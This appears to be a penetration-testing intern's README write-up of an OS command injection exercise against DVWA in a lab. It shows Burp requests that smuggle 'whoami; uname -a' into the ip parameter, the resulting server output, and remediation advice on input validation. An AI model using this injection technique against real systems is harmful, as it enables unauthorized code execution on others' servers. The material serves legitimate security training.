# Day 26: OS Command Injection Testing & Remote Code Execution (RCE)

## 📌 Project Overview
This repository contains the technical walkthroughs, execution steps, and verification evidence completed during **Day 26 of my Vulnerability Assessment and Penetration Testing (VAPT) Internship with TriosCyber** (in partnership with Ernith) [✏️ 0.1.62].

The objective of this assignment was to identify and exploit an OS Command Injection vulnerability within a web-based utility tool [✏️ 0.1.62]. By leveraging command chaining techniques, the exploit successfully bypassed intended function scopes to execute arbitrary native operating system commands directly on the underlying Linux host server environment [✏️ 0.1.62, 0.1.64].

---

## 🛠️ Lab Environment & Target Details
* **Target Application Sandbox:** Damn Vulnerable Web Application (DVWA v1.8) [✏️ 0.1.62]
* **Target Security Profile Mode:** Low (`security=low`) [✏️ 0.1.62]
* **Vulnerable Testing Endpoint:** `POST /dvwa/vulnerabilities/exec/` [✏️ 0.1.62, 0.1.63]
* **Vulnerable Input Vector Parameter:** `ip` [✏️ 0.1.62]
* **Target Host IP Address:** `192.168.145.134` [✏️ 0.1.62]
* **Primary Tools Utilized:** Mozilla Firefox & Burp Suite Community Edition (Proxy & Repeater) [✏️ 0.1.62, 0.1.63]

---

## 🚀 Step-by-Step Test Sequence & Technical Findings

### 1. Intercepting Baseline Traffic (Burp Proxy & Repeater)
Navigated to the **Command Execution** utility portal interface and executed a standard connectivity lookup request [✏️ 0.1.63]. The outbound HTTP `POST` transaction request was captured inside Burp Proxy and transferred to Burp Repeater to analyze the parameter payload syntax mapping [✏️ 0.1.63]:

```http
POST /dvwa/vulnerabilities/exec/ HTTP/1.1
Host: 192.168.145.134
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Content-Type: application/x-www-form-urlencoded
Cookie: security=low; PHPSESSID=c8q05ruidd0b6otc507c15co0

ip=172.0.0.1&Submit=Submit
```
[✏️ 0.1.63]

---

### 2. Parameter Injection & Command Chaining Execution
Because the user input buffer is passed directly into a backend operating system shell wrapper without character validation, shell command separator operators (`%3B` / `;`) were appended to the `ip` parameter string inside Burp Repeater to chain secondary system queries (`whoami` and `uname -a`) [✏️ 0.1.63, 0.1.64]:

```http
POST /dvwa/vulnerabilities/exec/ HTTP/1.1
Host: 192.168.145.134
Content-Type: application/x-www-form-urlencoded
Cookie: security=low; PHPSESSID=c8q05ruidd0b6otc507c15co0

ip=172.0.0.1%3B+whoami%3B+uname+-a&Submit=Submit
```
[✏️ 0.1.63, 0.1.64]
* **Decoded Request Parameter Payload:** `172.0.0.1; whoami; uname -a` [✏️ 0.1.64]

---

### 3. Response Analysis & Success Verification
* **HTTP Response Transaction Status:** `HTTP/1.1 200 OK` [✏️ 0.1.64]
* **Exposed Server Infrastructure Signatures:** `Server: Apache/2.2.14 (Ubuntu) mod_mono/2.4.3 PHP/5.3.2-1ubuntu4.30` [✏️ 0.1.64]
* **Technical Analysis & Output Trace:** The database/web server executed the original `ping` system process, encountered the structural semicolon delimiter token, and proceeded to execute the arbitrary secondary command stack strings sequentially [✏️ 0.1.64]. The raw application response pane successfully rendered the host terminal output strings, proving unconditional Remote Code Execution (RCE) on the underlying host operating system [✏️ 0.1.64]:
  ```plaintext
  PING 172.0.0.1 (172.0.0.1) 56(84) bytes of data.
  --- 172.0.0.1 ping statistics ---
  3 packets transmitted, 3 received, 0% packet loss

  www-data

  Linux owaspbwa 2.6.32-24-generic #39-Ubuntu SMP Wed Jul 28 06:04:56 UTC 2010 i686 GNU/Linux
  ```

---

## 📊 Vulnerability Summary Matrix

| Evaluation Metric | Technical Assessment Details |
| :--- | :--- |
| **Vulnerability Class** | OS Command Injection / Remote Code Execution (CWE-78 / RCE) [✏️ 0.1.62, 0.1.64] |
| **Target Endpoint Path** | `POST /dvwa/vulnerabilities/exec/` [✏️ 0.1.62, 0.1.64] |
| **Vulnerable Parameter** | `ip` body variable parameter [✏️ 0.1.62, 0.1.64] |
| **Effective Exploit Payload** | `172.0.0.1; whoami; uname -a` [✏️ 0.1.64] |
| **HTTP Response Status** | **200 OK** [✏️ 0.1.64] |
| **Target Host Operating System** | Ubuntu Linux Kernel Build 2.6.32 (OWASP BWA Host Architecture) [✏️ 0.1.62, 0.1.64] |
| **Laboratory Challenge Status** | ✅ **SUCCESSFUL (RCE Confirmed)** [✏️ 0.1.64] |

---

## 🛡️ Key Takeaways & Remediation Guidelines

### 1. Completely Avoid Shell Invocation Wrapper Functions
Web application backends should avoid passing unstructured user data directly into system-level shell execution wrappers (such as PHP's `exec()`, `system()`, `passthru()`, or `shell_exec()`) [✏️ 0.1.65]. Whenever functionality requires specialized lookups, utilize secure programmatic built-in application APIs or pre-compiled class libraries that do not spawn sub-shell terminals.

### 2. Implement Restrictive Server-Side Input Allow-lists
Before passing values to system utilities, validate all incoming strings against an ironclad, single-purpose regular expression allow-list [✏️ 0.1.65]. For networking functions, enforce native data type filters to confirm the incoming parameter matches a valid format, stripping all punctuation structures or system tokens [✏️ 0.1.65]:
```php
// Secure PHP Input Format Filtering Example
if (filter_var(\$ip, FILTER_VALIDATE_IP)) {
    // Process argument securely after data structural confirmation
} else {
    throw new InvalidArgumentException("Security Exception: Malformed Input Signature Rejected");
}
```
[✏️ 0.1.65]

---

## 📂 Repository Structure
```plaintext
.
├── README.md
├── screenshots/
│   ├── intercept_ping_utility.png
│   ├── command_chaining_repeater.png
│   └── successful_rce_output.png
└── outputs/
    └── rce_terminal_stdout_capture.txt
```

---

## 👤 Author
**Azeez Umar Opeyemi**
* 💼 **Role:** VAPT Intern at TriosCyber
* 📧 **Email:** umaropeyemiazeez@gmail.com
* 🐙 **GitHub:** [itzumaz](https://github.com/itzumaz)
* 🔗 **LinkedIn:** [Azeez Umar Opeyemi](https://www.linkedin.com/in/azeez-umar-opeyemi-201a433a4/)
